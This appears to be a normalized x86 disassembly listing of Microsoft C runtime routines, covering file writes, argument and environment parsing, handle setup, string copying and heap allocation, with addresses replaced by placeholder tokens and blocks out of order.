mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4141df
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_411a4d
push esi
mov edi eax
call sub_41423e
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_411a4d
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_413d5c
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_40e7ac
mov [ eax ] 0x1c
call sub_40e7b5
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_40e739
pop ecx
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
mov [ eax ] esi
jmp r-xdata
sub_411bd8
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_413e13
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_40bb22
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_411c65
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
pop esi
retn
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
push esi
call sub_41099c
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_411c8f
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_40fcc3
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_411dcd
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_411dcd
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_411e07
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_40df12
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_4149ea
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_411e5f
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_40df12
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_40bb22
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_40cb90
pop ecx
push esi
call sub_412760
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_40c218
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_40bb22
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_412760
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_412670
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_40cb90
pop ecx
sub_411f18
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_40df12
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_411fb1
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_40bb22
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_411fb1
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_40cb90
pop ecx
sub_411fb1
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_412165
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_40bb22
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_40bb22
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_40ce30
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40c218
pop ecx
mov [ esp + 0x10 ] ebx
sub_412297
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_40bb22
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_40cb90
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_40bb22
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_412453
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_41248c
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_41248c
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_41248c
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_412760
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_412760
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_412670
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_412670
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_412680
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_412680
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_412680
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_414a2c
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_412760
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_40c260
add esp 0x10
sub_4125e0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_412670
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_412680
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_412760
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4127db
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40e7be
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x9
call sub_40e83e
push ebx
call sub_40ec48
push 0x9
mov edi eax
call sub_40e89f
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_40cc70
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_412868
push esi
push 0xc
call sub_40e83e
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x0
call sub_41288f
push 0xc
mov esi eax
call sub_40e89f
add esp 0x14
mov eax esi
pop esi
retn
sub_41288f
push ebp
mov ebp esp
sub esp 0x108
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
push ebx
call sub_412964
test eax eax
pop ecx
jne r-xdata
xor eax eax
inc eax
cmp eax 0x104
ja r-xdata
lea eax [ ebp - 0x4 ]
and [ ebp + 0xb ] 0x0
push eax
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp + 0x8 ]
add bl 0x40
push 0x104
push eax
mov [ ebp + 0x8 ] bl
mov [ ebp + 0x9 ] 0x3a
mov [ ebp + 0xa ] 0x2e
call [ GetFullPathNameA@IAT ]
jmp r-xdata
call sub_40e7b5
mov [ eax ] 0xf
call sub_40e7ac
mov [ eax ] 0xd
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
test eax eax
je r-xdata
cmp eax [ ebp + 0x10 ]
jle r-xdata
cmp eax [ ebp + 0x10 ]
jg r-xdata
lea eax [ ebp - 0x108 ]
push eax
push ecx
call sub_412670
pop ecx
pop ecx
jmp r-xdata
call sub_40e7ac
mov [ eax ] 0x22
jmp r-xdata
push eax
call sub_40bb22
pop ecx
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
pop ebx
leave
retn
call sub_40e7ac
mov [ eax ] 0xc
jmp r-xdata
sub_412964
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x1
pop eax
pop ebp
retn
and [ ebp + 0xb ] 0x0
add al 0x40
mov [ ebp + 0x8 ] al
lea eax [ ebp + 0x8 ]
push eax
mov [ ebp + 0x9 ] 0x3a
mov [ ebp + 0xa ] 0x5c
call [ GetDriveTypeA@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
cmp eax 0x1
je r-xdata
sub_41299b
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
jne r-xdata
push esi
push 0x19
call sub_40e83e
mov edx [ ebp + 0x10 ]
pop ecx
test edx edx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40c260
add esp 0xc
jmp r-xdata
mov eax edx
dec edx
test eax eax
pop esi
je r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop ebp
retn
push 0x19
call sub_40e89f
mov eax [ ebp + 0x8 ]
pop ecx
lea ecx [ edx + 0x1 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
inc edi
inc ecx
test al al
